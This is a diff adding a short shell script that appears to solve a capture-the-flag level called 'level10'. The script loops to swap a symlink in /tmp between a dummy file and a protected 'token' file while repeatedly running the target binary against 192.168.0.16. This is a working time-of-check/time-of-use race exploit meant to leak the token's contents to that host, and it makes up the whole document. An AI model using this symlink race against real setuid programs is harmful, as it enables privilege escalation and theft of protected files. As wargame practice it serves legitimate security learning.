@@ -1,0 +1,14 @@
+#!/bin/sh
+
+touch /tmp/lol
+touch /tmp/exploit
+
+chmod 777 /tmp/lol
+chmod 777 /tmp/exploit
+
+while true; do
+ln -sf /tmp/lol /tmp/exploit
+./level10 /tmp/exploit 192.168.0.16
+ln -sf token /tmp/exploit
+done
+
